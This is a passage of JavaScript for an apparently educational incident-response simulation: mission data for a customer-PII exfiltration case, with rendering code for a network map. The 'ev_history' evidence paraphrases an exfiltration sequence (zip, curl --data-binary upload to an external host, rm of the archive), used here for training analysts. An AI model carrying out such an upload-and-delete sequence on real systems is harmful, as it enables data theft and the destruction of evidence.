          analyst: 'archive_creation.log — customer_data.zip (1.2 GB) built from customer_database.csv at 02:58.',
          technical: 'archive_creation.log — 02:58 zip of 240,000-row source → customer_data.zip (1.2 GB); exfil staging.',
          terms: ['archive', 'dataExfiltration'],
        },
      },
      {
        id: 'ev_transfer', label: 'The archive was uploaded to an external address.',
        qualityWeight: 3, source: 'transfer.log',
        layers: {
          beginner: {
            summary: 'The archive was uploaded to an outside address and the 1.2 GB transfer finished.',
            why: 'This is the actual theft — the data physically leaving the company network.',
            prompt: 'The data has left — when does a risk become a real breach?',
          },
          analyst: 'transfer.log — 03:04 UPLOAD customer_data.zip → 198.51.100.23 (external); 1.2 GB COMPLETE at 03:09.',
          technical: 'transfer.log — HTTPS POST of 1.2 GB archive to external dst 198.51.100.23; transfer COMPLETE.',
          terms: ['dataExfiltration'],
        },
      },
      {
        id: 'ev_external_dest', label: 'The destination is an unknown external host in the LATAM region.',
        qualityWeight: 3, source: 'grep external network_activity.log',
        layers: {
          beginner: {
            summary: 'The upload went to an unknown server outside the company, in the LATAM region.',
            why: 'Once data reaches an outside server you do not control, it cannot be recalled — the breach is real.',
            prompt: 'The data is on a stranger'+"'"+'s server now — what does CyberCorp owe the affected customers?',
          },
          analyst: 'Egress to 198.51.100.23 (LATAM geo), owner unknown — not a CyberCorp asset or known partner.',
          technical: 'grep external network_activity.log — dst 198.51.100.23 outside all corp ranges; attacker-controlled host.',
          terms: ['dataExfiltration', 'dlp'],
        },
      },
      {
        id: 'ev_endpoint', label: 'The archive was built and uploaded from one workstation (WS-FIN-04).',
        qualityWeight: 2, source: 'endpoint_activity.log',
        layers: {
          beginner: {
            summary: 'Both the zipping and the upload happened on a single workstation, WS-FIN-04.',
            why: 'Knowing the exact machine lets the response team isolate it and preserve the evidence.',
            prompt: 'You have the machine — what should the IR team do with it first?',
          },
          analyst: 'endpoint_activity.log — zip + upload processes both on WS-FIN-04; staging host identified.',
          technical: 'endpoint_activity.log — 02:58 zip, 03:04 upload client, both on WS-FIN-04; isolate + image for forensics.',
          terms: ['incidentResponse'],
        },
      },
      {
        id: 'ev_history', label: 'The shell history shows build-upload-delete — a deliberate steal-and-clean.',
        qualityWeight: 2, source: 'history',
        layers: {
          beginner: {
            summary: 'The commands run show the archive made, uploaded, then deleted to cover tracks.',
            why: 'Deleting the evidence afterward shows this was deliberate, not an accident.',
            prompt: 'They tried to delete the file afterward — what does that say about intent?',
          },
          analyst: 'Shell history: zip → curl POST to 198.51.100.23 → rm — exfil then anti-forensic cleanup.',
          technical: 'history — zip -r; curl --data-binary @archive → external; rm archive (evidence destruction attempt).',
          terms: ['dataExfiltration'],
        },
      },
      {
        id: 'ev_volume', label: 'The lost data is 1.2 GB of restricted PII for 240,000 people.',
        qualityWeight: 2, source: 'stat customer_database.csv',
        layers: {
          beginner: {
            summary: 'The stolen file holds names, emails, addresses and payment references for 240,000 customers.',
            why: 'This is regulated personal data — losing it harms real people and triggers legal duties.',
            prompt: 'Restricted PII for a quarter-million people is gone — how serious is this?',
          },
          analyst: 'customer_database.csv = 1.2 GB / 240,000 rows of RESTRICTED PII (names, emails, addresses, payment refs).',
          technical: 'stat customer_database.csv — 1.2 GB, 240,000 rows, classification RESTRICTED (regulated PII).',
          terms: ['pii', 'restricted'],
        },
      },
      {
        id: 'ev_dlp', label: 'DLP independently classified this as confirmed data exfiltration.',
        qualityWeight: 2, source: 'system_alerts.log', setFlag: 'dataExfiltrationConfirmed',
        layers: {
          beginner: {
            summary: 'The data-loss-prevention system already labeled this a confirmed data-exfiltration event.',
            why: 'Independent confirmation that the separate clues add up to one real breach.',
            prompt: 'The system already confirms exfiltration — are you ready to name the root cause and act?',
          },
          analyst: 'DLP CRITICAL alert at 03:05: large outbound transfer of RESTRICTED data → confirmed exfiltration.',
          technical: 'system_alerts.log — DLP classification: confirmed data exfiltration of restricted PII (large egress).',
          terms: ['dlp', 'dataExfiltration'],
        },
      },
      {
        id: 'ev_incident_notes', label: 'The IR runbook requires containing the channel, escalating, and recommending notification.',
        qualityWeight: 1, source: 'incident_notes.txt',
        layers: {
          beginner: {
            summary: 'The incident-response runbook spells out the required steps for a confirmed PII breach.',
            why: 'Following the runbook turns a confirmed breach into a complete, defensible response.',
            prompt: 'With the runbook in hand, what is the full response — not just the first step?',
          },
          analyst: 'IR runbook: confirmed PII exfiltration → contain the channel, escalate to IR, recommend customer + regulator notification.',
          technical: 'incident_notes.txt — IR runbook: contain egress channel, escalate to IR, recommend customer + regulator notification on confirmed PII loss.',
          terms: ['incidentResponse', 'breachNotification'],
        },
      },
      {
        id: 'ev_legal', label: 'The loss crosses breach-notification thresholds — regulators must be told.',
        qualityWeight: 2, source: 'legal_exposure_report.txt',
        layers: {
          beginner: {
            summary: 'Legal confirms the company must notify regulators and customers about this loss.',
            why: 'For regulated personal data, notification is a legal duty — delay means fines and harm.',
            prompt: 'Notification is now required by law — how does that change your recommendation?',
          },
          analyst: 'Legal: 240,000 PII records exposed → breach-notification thresholds met; penalty risk on delay.',
          technical: 'legal_exposure_report.txt — regulatory breach-notification thresholds MET; delayed notice → penalties.',
          terms: ['breachNotification', 'pii'],
        },
      },
      {
        id: 'ev_manager', label: 'Your SOC Lead confirms the priority and the limits of your authority.',
        qualityWeight: 1, source: 'manager_briefing.txt',
        layers: {
          beginner: {
            summary: 'Your manager confirms this is top priority and that you recommend — you do not act company-wide.',
            why: 'Knowing the scope of your authority keeps your recommendation realistic and actionable.',
            prompt: 'Within an intern'+"'"+'s authority, what is the strongest response you can recommend?',
          },
          analyst: 'Manager: top priority; build timeline + root cause; recommend containment/escalation, not unilateral company-wide action.',
          technical: 'manager_briefing.txt — scope of authority = recommend; company-wide actions routed via SOC Lead / IR.',
          terms: ['incidentResponse'],
        },
      },
    ],

    actions: [
      {
        id: 'recommend_disable_account',
        type: 'recommendation',
        label: 'Recommend Account Disablement',
        summary: 'Recommend disabling the compromised Finance account to cut off the operator.',
        outcomeSub: 'You recommended disabling the compromised account.',
        deltas: { securityPosture: 16, complianceExposure: -10, businessContinuity: -5, executiveTrust: 8, careerReputation: 9 },
        setFlags: ['exfilContained'],
        deniedNote: 'Leadership held off on disabling the account pending firmer confirmation of compromise.',
        consequence: {
          immediate: ['The compromised account is disabled; the operator loses their way back in.'],
          business: ['Cuts the attacker'+"'"+'s access, though the data already taken is still gone.'],
          future: ['Fast containment of the access path strengthens your standing on later incidents.'],
        },
      },
      {
        id: 'recommend_block_device',
        type: 'recommendation',
        label: 'Recommend Device Block',
        summary: 'Recommend isolating the staging workstation and blocking the external destination.',
        outcomeSub: 'You recommended isolating the endpoint and blocking the destination.',
        deltas: { securityPosture: 15, complianceExposure: -8, businessContinuity: -4, executiveTrust: 7, careerReputation: 8 },
        setFlags: ['exfilContained'],
        deniedNote: 'Leadership wanted the account contained first before isolating hardware.',
        consequence: {
          immediate: ['WS-FIN-04 is isolated and the external host is blocked at the firewall.'],
          business: ['Stops any further upload from that machine; the endpoint is preserved for forensics.'],
          future: ['Blocking the channel is recorded as decisive containment.'],
        },
      },
      {
        id: 'recommend_forensics',
        type: 'recommendation',
        label: 'Recommend Forensics Review',
        summary: 'Recommend a forensic image and review of the staging workstation.',
        outcomeSub: 'You recommended a forensic review of the endpoint.',
        deltas: { securityPosture: 10, complianceExposure: -6, executiveTrust: 8, careerReputation: 7, businessContinuity: -2 },
        setFlags: ['incidentResponseEscalated'],
        deniedNote: 'Leadership wanted containment locked in before committing forensic resources.',
        consequence: {
          immediate: ['A forensic image of WS-FIN-04 is taken to preserve the full evidence chain.'],
          business: ['Forensics establishes exactly what was taken and how — vital for the regulator report.'],
          future: ['A clean evidence chain protects the company in the investigation that follows.'],
        },
      },
      {
        id: 'recommend_legal',
        type: 'recommendation',
        label: 'Recommend Legal & Regulatory Notification',
        summary: 'Recommend notifying Legal and the relevant data-protection regulators.',
        outcomeSub: 'You recommended legal and regulatory notification.',
        deltas: { complianceExposure: -16, executiveTrust: 9, careerReputation: 7, securityPosture: 3, businessContinuity: -3 },
        setFlags: ['incidentResponseEscalated'],
        deniedNote: 'Leadership wanted the full scope confirmed before formally notifying regulators.',
        consequence: {
          immediate: ['Legal is engaged and the regulator-notification clock is handled correctly.'],
          business: ['Meeting the legal duty on time avoids penalties for late disclosure.'],
          future: ['Handling notification by the book protects the company from compounding fines.'],
        },
      },
      {
        id: 'recommend_customer_notify',
        type: 'recommendation',
        label: 'Recommend Customer Notification',
        summary: 'Recommend notifying the 240,000 affected customers of the breach.',
        outcomeSub: 'You recommended notifying affected customers.',
        deltas: { complianceExposure: -12, executiveTrust: 6, careerReputation: 8, businessContinuity: -5, securityPosture: 2 },
        setFlags: ['customerNotificationRecommended'],
        deniedNote: 'Leadership wanted to confirm the affected-record count before notifying customers.',
        consequence: {
          immediate: ['Affected customers are told their data was exposed and what to watch for.'],
          business: ['Short-term reputational cost, but transparency preserves long-term trust and meets the law.'],
          future: ['Doing right by customers under pressure builds lasting credibility.'],
        },
      },
      {
        id: 'submit_incident_report',
        type: 'recommendation',
        label: 'Submit Incident Report',
        summary: 'Submit the complete incident report: timeline, root cause, containment, and notification plan.',
        outcomeSub: 'You submitted the full incident report.',
        deltas: { securityPosture: 14, complianceExposure: -14, executiveTrust: 12, careerReputation: 12, businessContinuity: -3 },
        setFlags: ['dataExfiltrationConfirmed', 'incidentResponseEscalated'],
        deniedNote: 'Leadership sent the report back asking for a clearer containment recommendation.',
        consequence: {
          immediate: ['A complete, evidence-backed incident report goes to leadership and IR.'],
          business: ['The board gets the clear account it asked for: how it happened, what was lost, how it is contained.'],
          future: ['A thorough capstone report cements your reputation as a trusted analyst.'],
        },
      },
      {
        id: 'continue_investigation',
        type: 'direct',
        label: 'Continue Investigating',
        summary: 'Hold off on any response and keep gathering information.',
        outcomeSub: 'You chose to keep investigating before recommending anything.',
        deltas: { securityPosture: -8, complianceExposure: 12, businessContinuity: 1, careerReputation: -5 },
        consequence: {
          immediate: ['No containment yet; the attacker keeps their foothold and the notification clock keeps running.'],
          business: ['The evidence already confirms a breach — delay only adds regulatory and reputational risk.'],
          future: ['Hesitating on a confirmed, time-sensitive breach is noted as a costly delay.'],
        },
      },
      {
        id: 'downgrade',
        type: 'direct',
        label: 'Downgrade to Low Priority',
        summary: 'Treat the alert as low-risk and defer it.',
        outcomeSub: 'You downgraded the incident.',
        deltas: { securityPosture: -24, complianceExposure: 30, businessContinuity: 2, careerReputation: -20, executiveTrust: -20 },
        consequence: {
          immediate: ['A confirmed exfiltration of 240,000 PII records is left unaddressed.'],
          business: ['Missing the legal notification window turns a breach into major fines and lasting harm.'],
          future: ['Downgrading a confirmed critical breach is a severe blow to trust in your judgment.'],
        },
      },
    ],

    lockedActions: [
      {
        id: 'companywide_lockdown',
        label: 'Execute Company-Wide Data Lockdown',
        reason: 'Cybersecurity Interns cannot lock down company-wide systems. That is an Incident Commander decision.',
        alternativeRecommendationId: 'rec_companywide_lockdown',
      },
      {
        id: 'terminate_contractor',
        label: 'Terminate the Contractor'+"'"+'s Contract',
        reason: 'Interns cannot terminate a vendor contract. Route this through Legal, HR, and your SOC Lead.',
        alternativeRecommendationId: 'rec_terminate_contractor',
      },
    ],

    recommendations: {
      rec_companywide_lockdown: {
        label: 'Company-Wide Data Lockdown',
        deltas: { securityPosture: 12, complianceExposure: -10, businessContinuity: -10, careerReputation: 6 },
        setFlags: ['exfilContained', 'incidentResponseEscalated'],
        deniedNote: 'Leadership declined a full lockdown without evidence the breach was spreading.',
        consequence: {
          immediate: ['Requested a broad lockdown to halt any further data movement.'],
          business: ['A lockdown is highly disruptive but guarantees nothing more leaves while IR investigates.'],
          future: ['A documented, decisive containment call carried into later work.'],
        },
      },
      rec_terminate_contractor: {
        label: 'Contractor Contract Termination',
        deltas: { securityPosture: 9, executiveTrust: 7, careerReputation: 8, complianceExposure: -6 },
        setFlags: ['incidentResponseEscalated'],
        deniedNote: 'Leadership deferred contract termination to Legal and HR pending the IR findings.',
        consequence: {
          immediate: ['Requested termination of the contractor tied to the exfiltration.'],
          business: ['Removes the recurring actor as a source of further incidents, via the proper channels.'],
          future: ['Closing out the contractor thread cleanly reduces risk going forward.'],
        },
      },
    },

    /* ------------------------------------------------------------------ *
     * DYNAMIC CONDITIONS — the headline feature. Each reads carry-flags set
     * by Assignments 001/002/003 and additively reshapes this case. They are
     * applied in openCareerMission via career-dynamic.js (pure, non-mutating):
     * addEvidence/addCommands keep 100% confidence achievable (every added
     * finding has a command to surface it); continuity shows in the brief;
     * outcomeNote + deltaMods show in the debrief (deltas are post-hoc, never
     * altering the leadership verdict).
     * ------------------------------------------------------------------ */
    dynamicConditions: [
      {
        /* A — BAD carry from Assignment 002: a rogue device left active became
         * the relay the stolen archive left through. */
        id: 'dyn_open_channel',
        when: { allOf: ['rogueDeviceActive'], noneOf: ['rogueDeviceContained'] },
        continuity: {
          from: 'ASSIGNMENT 002 · NETWORK EXPOSURE',
          decision: 'You left the unknown device 192.168.1.57 active on the network.',
          consequence: 'The stolen archive was relayed out through that same device — the exfiltration rode a door left open.',
          tone: 'bad',
        },
        addCommands: [
          {
            id: 'cmd_dyn_rogue_relay',
            match: ['grep 192.168.1.57 network_activity.log', 'grep 192.168.1.57', 'grep rogue network_activity.log'],
            help: 'trace the transfer through the un-removed device',
            output: [
              { t: 'grep 192.168.1.57 network_activity.log', c: 'head' },
              '  03:04  relay  customer_data.zip via 192.168.1.57 -> 198.51.100.23',
              '  # 192.168.1.57 = the rogue device left active in Assignment 002',
            ],
            reveals: ['ev_dyn_rogue_relay'],
            observation: 'The archive was relayed through 192.168.1.57 — the rogue device you left active in your earlier network case.',
            question: 'Had that device been removed back then, would this upload have had a path out at all?',
            next: 'finish the timeline and type  decide',
          },
        ],
        addEvidence: [
          {
            id: 'ev_dyn_rogue_relay', label: 'The archive was relayed out through the rogue device from Assignment 002.',
            qualityWeight: 1, source: 'grep 192.168.1.57 network_activity.log',
            layers: {
              beginner: {
                summary: 'The stolen data left through 192.168.1.57 — the unknown device you left active in the network case.',
                why: 'A device left on the network became the exact path the attacker used to ship the data out.',
                prompt: 'How much of this breach traces back to a door left open earlier?',
              },
              analyst: 'Egress relayed via 192.168.1.57 (rogue device, never contained in A002) → 198.51.100.23.',
              technical: 'network_activity.log — exfil hop through 192.168.1.57 (uncontained rogue host) to external dst.',
              terms: ['dataExfiltration', 'network'],
            },
          },
        ],
        addRisks: [
          { id: 'risk_dyn_open_channel', label: 'The archive left through a device left active in a prior case', triggeredBy: ['ev_dyn_rogue_relay'] },
        ],
        deltaMods: { complianceExposure: 10, businessContinuity: -6 },
        tone: 'bad',
        outcomeNote: 'Because the rogue device from Assignment 002 was never removed, the exfiltration used it as a relay — compliance exposure rose and recovery is slower. Containing that device earlier would have closed this path.',
      },
      {
        /* B — GOOD continuity payoff: any earlier link to the recurring
         * contractor makes attribution fast and high-confidence. */
        id: 'dyn_attribution',
        when: { anyOf: ['contractorAccountCompromised', 'contractorDeviceLinked', 'contractorAccessDiscovered'] },
        continuity: {
          from: 'PRIOR CASES · RECURRING ACTOR',
          decision: 'You linked the recurring contractor (J. Demir / ext-contractor-07) in an earlier case.',
          consequence: 'Threat intel maps this exfil session to that same identity — attribution is immediate, not guesswork.',
          tone: 'good',
        },
        addCommands: [
          {
            id: 'cmd_dyn_attribution',
            match: ['grep contractor threat_intel.log', 'cat threat_intel.log', 'grep contractor threat_intel'],
            help: 'cross-reference the session against prior-case intel',
            output: [
              { t: 'grep contractor threat_intel.log', c: 'head' },
              '  match: exfil session src == ext-contractor-07 (J. Demir)',
              '  linked to your prior cases — HIGH-confidence attribution',
            ],
            reveals: ['ev_dyn_attribution'],
            observation: 'Threat intel from your earlier cases maps this exfil session straight to ext-contractor-07 — attribution is immediate.',
            question: 'With the actor already known, what can the response do faster than starting from scratch?',
            next: 'finish the timeline and type  decide',
          },
        ],
        addEvidence: [
          {
            id: 'ev_dyn_attribution', label: 'Prior-case intel attributes the exfil to ext-contractor-07 (J. Demir).',
            qualityWeight: 1, source: 'grep contractor threat_intel.log',
            layers: {
              beginner: {
                summary: 'Intel from your earlier cases ties this theft to the same contractor, J. Demir.',
                why: 'Knowing exactly who did it lets the response move faster and more confidently.',
                prompt: 'How much time does already knowing the attacker save the response team?',
              },
              analyst: 'Threat-intel correlation: exfil session ↔ ext-contractor-07 (J. Demir), built from prior-case links.',
              technical: 'threat_intel.log — high-confidence attribution to ext-contractor-07 via prior-case identity graph.',
              terms: ['incidentResponse', 'rootCause'],
            },
          },
        ],
        addRisks: [
          { id: 'risk_dyn_attribution', label: 'The exfil identity matches the actor flagged in your prior cases', triggeredBy: ['ev_dyn_attribution'] },
        ],
        deltaMods: { executiveTrust: 4, careerReputation: 4 },
        tone: 'good',
        outcomeNote: 'Your earlier work tying the recurring contractor to this actor let you attribute the exfiltration with confidence — leadership credited the connected investigation.',
      },
      {
        /* C — GOOD carry from Assignment 003: enforced MFA limited the
         * compromised account, shrinking how much data could leave. */
        id: 'dyn_mfa_scope',
        when: { allOf: ['mfaRecommended'] },
        continuity: {
          from: 'ASSIGNMENT 003 · AUTH SECURITY',
          decision: 'You recommended enforcing MFA on the compromised account.',
          consequence: 'MFA challenged the session mid-transfer, so a smaller archive left — the enforced control shrank the breach.',
          tone: 'good',
        },
        addCommands: [
          {
            id: 'cmd_dyn_mfa_scope',
            match: ['grep mfa system_alerts.log', 'grep mfa', 'grep mfa system_alerts'],
            help: 'check how MFA enforcement limited the session',
            output: [
              { t: 'grep mfa system_alerts.log', c: 'head' },
              '  03:06  MFA challenge interrupted the session mid-transfer',
              '  partial archive only — fewer records reached the external host',
            ],
            reveals: ['ev_dyn_mfa_scope'],
            observation: 'The MFA enforcement you recommended earlier challenged the session mid-transfer, cutting the exfil short.',
            question: 'How much worse would this breach be if that control had not been in place?',
            next: 'finish the timeline and type  decide',
          },
        ],
        addEvidence: [
          {
            id: 'ev_dyn_mfa_scope', label: 'Enforced MFA cut the session short — a smaller archive left.',
            qualityWeight: 1, source: 'grep mfa system_alerts.log',
            layers: {
              beginner: {
                summary: 'Because MFA was enforced earlier, the attacker'+"'"+'s session was challenged and fewer records got out.',
                why: 'A control you put in place in a past case directly reduced the size of this breach.',
                prompt: 'How much did the earlier MFA decision shrink the damage here?',
              },
              analyst: 'MFA challenge interrupted the exfil session — partial transfer; reduced exfil volume vs un-enforced baseline.',
              technical: 'system_alerts.log — MFA step-up mid-session truncated egress; smaller archive reached external dst.',
              terms: ['mfa', 'dataExfiltration'],
            },
          },
        ],
        deltaMods: { complianceExposure: -8, securityPosture: 4 },
        tone: 'good',
        outcomeNote: 'Enforcing MFA in Assignment 003 cut the attacker'+"'"+'s window short — fewer records were exfiltrated and compliance exposure is lower than it would have been.',
      },
      {
        /* D — BAD carry from Assignment 001: prior sensitive-data exposure /
         * legal review makes this a repeat incident with higher stakes. */
        id: 'dyn_repeat_exposure',
        when: { anyOf: ['sensitiveDataExposed', 'legalReviewTriggered'] },
        continuity: {
          from: 'ASSIGNMENT 001 · DATA PROTECTION',
          decision: 'A prior case already flagged sensitive-data exposure or triggered legal review.',
          consequence: 'This is a repeat exposure for the same organization — regulators and legal treat it far more seriously.',
          tone: 'bad',
        },
        deltaMods: { complianceExposure: 6, executiveTrust: -2 },
        tone: 'bad',
        outcomeNote: 'Because sensitive data was already exposed in an earlier case, this counts as a repeat incident — regulatory and legal stakes are higher, strengthening the case for prompt customer notification.',
      },
    ],
  },
};

window.CAREER_MISSION_IDS = Object.keys(CAREER_MISSIONS);

/* ================================================================== *
 * INIT
 * ================================================================== */
/* ==================================================================
 * NETWORK / DEVICE MAP — reactive, review-only popup (Task #94).
 * Presentation only: it reads SIM.evidence to decide which nodes and
 * links are visible and how they are flagged. It writes NOTHING — no
 * localStorage, no score, no resource, no outcome. Missions without a
 * `map` block show no button and never build the overlay, so the M1
 * numeric path and every other mission are untouched.
 * ================================================================== */

function missionHasMap() {
  return !!(SIM.def && SIM.def.map && SIM.def.map.nodes);
}

// Status priority — higher wins when several statuses apply to one node.
const MAP_STATUS_RANK = { self: 5, suspicious: 4, target: 3, unknown: 2, identified: 1 };
const MAP_STATUS_TAG = {
  self: 'YOU', suspicious: 'UNAPPROVED', target: 'TARGETED', unknown: 'UNVERIFIED', identified: 'APPROVED',
};

function mapEsc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// A node appears once it is seeded or its revealing evidence is surfaced.
function mapNodeVisible(node) {
  if (!node) return false;
  if (node.seed) return true;
  return !!(node.revealBy && SIM.evidence.has(node.revealBy));
}

// Resolve a node's status from surfaced evidence (order-independent).
function mapNodeStatus(node) {
  let status = node.status || '';
  let rank = MAP_STATUS_RANK[status] || 0;
  const by = node.statusBy || {};
  Object.keys(by).forEach(evId => {
    if (!SIM.evidence.has(evId)) return;
    const r = MAP_STATUS_RANK[by[evId]] || 0;
    if (r > rank) { rank = r; status = by[evId]; }
  });
  return status;
}

// A link shows once both endpoints are visible and its evidence (if any) is up.
function mapLinkVisible(link, nodes) {
  if (!mapNodeVisible(nodes[link.a]) || !mapNodeVisible(nodes[link.b])) return false;
  if (link.revealBy && !SIM.evidence.has(link.revealBy)) return false;
  return true;
}

function mapVisibleNodeCount() {
  const nodes = (SIM.def && SIM.def.map && SIM.def.map.nodes) || {};
  let shown = 0, total = 0;
  Object.keys(nodes).forEach(id => { total++; if (mapNodeVisible(nodes[id])) shown++; });
  return { shown, total };
}

/* --- Floating intel card (compact port of the lab pattern) --- */
let simMapIntelEl = null, simMapIntelTimer = null;
function simMapIntelEnsure() {
  if (simMapIntelEl) return simMapIntelEl;
  const el = document.createElement('div');
  el.className = 'sim-map-intel';
  el.setAttribute('role', 'tooltip');
  el.hidden = true;
  el.addEventListener('mouseenter', () => {
    if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  });
  el.addEventListener('mouseleave', simMapIntelScheduleHide);
  document.body.appendChild(el);
  simMapIntelEl = el;
  return el;
}
function simMapIntelRow(k, v) {
  return v ? `<div class="sim-map-intel-row"><span class="sim-map-intel-k">${mapEsc(k)}</span><span class="sim-map-intel-v">${mapEsc(v)}</span></div>` : '';
}
function simMapIntelShow(intel, title, kind, anchorEl) {
  if (!intel || !anchorEl) return;
  if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  const el = simMapIntelEnsure();
  el.innerHTML = `
    <div class="sim-map-intel-head">
      ${kind ? `<span class="sim-map-intel-kind">${mapEsc(kind)}</span>` : ''}
      <span class="sim-map-intel-title">${mapEsc(title)}</span>
    </div>
    ${simMapIntelRow('What it is', intel.what)}
    ${simMapIntelRow('How an analyst surfaces it', intel.technique)}
    ${simMapIntelRow('Why it matters', intel.why)}`;
  el.hidden = false;
  // Measure after layout, then clamp fully inside the viewport.
  const a = anchorEl.getBoundingClientRect();
  const cw = el.offsetWidth, ch = el.offsetHeight, m = 10;
  const vw = window.innerWidth, vh = window.innerHeight;
  let top = a.top - ch - m; if (top < m) top = a.bottom + m;
  let left = a.left + a.width / 2 - cw / 2;
  left = Math.max(m, Math.min(left, vw - cw - m));
  top = Math.max(m, Math.min(top, vh - ch - m));
  el.style.left = left + 'px';
  el.style.top = top + 'px';
}
function simMapIntelScheduleHide() {
  if (simMapIntelTimer) clearTimeout(simMapIntelTimer);
  simMapIntelTimer = setTimeout(simMapIntelHide, 140);
}
function simMapIntelHide() {
  if (simMapIntelTimer) { clearTimeout(simMapIntelTimer); simMapIntelTimer = null; }
  if (simMapIntelEl) simMapIntelEl.hidden = true;
}
function simMapIntelBind(el, intel, title, kind) {
  if (!intel || !el) return;
  el.addEventListener('mouseenter', () => simMapIntelShow(intel, title, kind, el));
  el.addEventListener('mouseleave', simMapIntelScheduleHide);
  el.addEventListener('focus', () => simMapIntelShow(intel, title, kind, el));
  el.addEventListener('blur', simMapIntelHide);
  el.addEventListener('click', e => {
    e.preventDefault();
    e.stopPropagation();
    if (simMapIntelEl && !simMapIntelEl.hidden) simMapIntelHide();
    else simMapIntelShow(intel, title, kind, el);
  });
  el.addEventListener('keydown', e => {
    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); simMapIntelShow(intel, title, kind, el); }
  });
}

/* --- Overlay shell (built once, on first open) --- */
let simMapEl = null;
function simMapEnsure() {
  if (simMapEl) return simMapEl;
  const ov = document.createElement('div');
  ov.className = 'sim-map-overlay';
  ov.id = 'simMapOverlay';
  ov.hidden = true;
  ov.innerHTML = `
    <div class="sim-map-modal" role="dialog" aria-modal="true" aria-label="Network and device map">
      <div class="sim-map-head">
        <span class="sim-map-title">◈ NETWORK MAP</span>
        <span class="sim-map-cap" id="simMapCap"></span>
        <button type="button" class="sim-map-close" data-map-close aria-label="Close network map">✕</button>
      </div>
      <div class="sim-map-stage" id="simMapStage">
        <svg class="sim-map-svg" id="simMapSvg" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden="true"></svg>
        <div class="sim-map-nodes" id="simMapNodes"></div>
      </div>
      <div class="sim-map-foot">
        <div class="sim-map-legend">
          <span class="sim-map-leg"><i class="sim-map-swatch is-self"></i>You</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-known"></i>Known / approved</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-unknown"></i>Unverified</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-target"></i>Targeted</span>
          <span class="sim-map-leg"><i class="sim-map-swatch is-suspicious"></i>Unapproved</span>
        </div>
        <p class="sim-map-hint" id="simMapHint"></p>
      </div>
    </div>`;
  // Overlay lives outside #careerOps, so it handles its own backdrop/close clicks.
  ov.addEventListener('click', e => {
    if (e.target === ov || e.target.closest('[data-map-close]')) closeSimMap();
  });
  document.body.appendChild(ov);
  simMapEl = ov;
  return ov;
}

function openSimMap() {
  if (!missionHasMap()) return;
  SIM.mapOpen = true;
  simMapEnsure().hidden = false;
  renderSimMap();
  const closeBtn = simMapEl.querySelector('[data-map-close]');
  if (closeBtn) closeBtn.focus();
}

function closeSimMap() {
  const wasOpen = SIM.mapOpen;
  SIM.mapOpen = false;
  simMapIntelHide();
  if (simMapEl) simMapEl.hidden = true;
  if (wasOpen) {
    const btn = document.getElementById('simMapBtn');
    if (btn && !btn.hidden) btn.focus();
  }
}

function renderSimMap() {
  if (!simMapEl || !missionHasMap()) return;
  const map = SIM.def.map;
  const nodes = map.nodes;
  const svg = simMapEl.querySelector('#simMapSvg');
  const host = simMapEl.querySelector('#simMapNodes');
  const cap = simMapEl.querySelector('#simMapCap');
  const hint = simMapEl.querySelector('#simMapHint');
  if (!svg || !host) return;
  if (cap) cap.textContent = map.cap || '';
  svg.innerHTML = '';
  host.innerHTML = '';
  const SVGNS = 'http://www.w3.org/2000/svg';

  // Links first (only where visible), with a focusable midpoint intel marker.
  (map.links || []).forEach(lk => {
    if (!mapLinkVisible(lk, nodes)) return;
    const na = nodes[lk.a], nb = nodes[lk.b];
    const line = document.createElementNS(SVGNS, 'line');
    line.setAttribute('x1', na.x); line.setAttribute('y1', na.y);
    line.setAttribute('x2', nb.x); line.setAttribute('y2', nb.y);
    line.setAttribute('class', 'sim-map-link' + (lk.danger ? ' is-danger' : ''));  // SVG class is read-only
    svg.appendChild(line);
    if (!lk.intel) return;
    const mx = (na.x + nb.x) / 2, my = (na.y + nb.y) / 2;
    const mk = document.createElement('button');
    mk.type = 'button';
    mk.className = 'sim-map-linkmid' + (lk.danger ? ' is-danger' : '');
    mk.style.left = mx + '%';
    mk.style.top = my + '%';
    mk.textContent = 'i';
    mk.setAttribute('aria-label', `Connection ${na.label} to ${nb.label} — analyst intel`);
    host.appendChild(mk);
    simMapIntelBind(mk, lk.intel, `${na.label} → ${nb.label}`, 'CONNECTION');
  });

  // Node chips.
  Object.keys(nodes).forEach(id => {
    const n = nodes[id];
    if (!mapNodeVisible(n)) return;
    const status = mapNodeStatus(n);
    const div = document.createElement('div');
    div.className = 'sim-map-node' + (status ? ' is-' + status : '');
    div.style.left = n.x + '%';
    div.style.top = n.y + '%';
    const tag = status && MAP_STATUS_TAG[status]
      ? `<span class="sim-map-node-tag">${mapEsc(MAP_STATUS_TAG[status])}</span>` : '';
    div.innerHTML = `
      <span class="sim-map-node-dot" aria-hidden="true">${mapEsc(n.glyph || '•')}</span>
      <span class="sim-map-node-label">${mapEsc(n.label || '')}</span>
      <span class="sim-map-node-sub">${mapEsc(n.sub || '')}</span>
      ${tag}`;
    if (n.intel) {
      div.tabIndex = 0;
      div.setAttribute('role', 'button');
      div.setAttribute('aria-label', `${n.label}${n.sub ? ', ' + n.sub : ''} — analyst intel`);
      simMapIntelBind(div, n.intel, n.label, n.sub ? n.sub.toUpperCase() : '');
    }
    host.appendChild(div);
  });

  const { shown, total } = mapVisibleNodeCount();
  if (hint) {
    hint.textContent = shown < total
      ? `${shown} of ${total} devices mapped — keep investigating in the terminal to reveal the rest.`
      : (map.hint || 'All devices mapped. Select any node or connection for analyst intel.');
  }
}

// Toggle + label the terminal-panel button to match map availability and progress.
function updateMapButton() {
  const btn = document.getElementById('simMapBtn');
  if (!btn) return;
  if (!missionHasMap()) { btn.hidden = true; return; }
  btn.hidden = false;
  const { shown, total } = mapVisibleNodeCount();
  btn.textContent = `◈ NETWORK MAP · ${shown}/${total}`;
}

function simInit() {
  // Shipping integration: re-hydrate from the authoritative progress.career now
  // that the host has loaded ech.progress.v1 (module-eval ran before that and only
  // had defaults). Harmless standalone (loadCareerState reads its own key).
  CAREER = loadCareerState();
  renderResourceBar();

  const back = document.getElementById('careerBackBtn');
  if (back) back.addEventListener('click', returnFromCareerMission);

  const resetBtn = document.getElementById('simResetBtn');
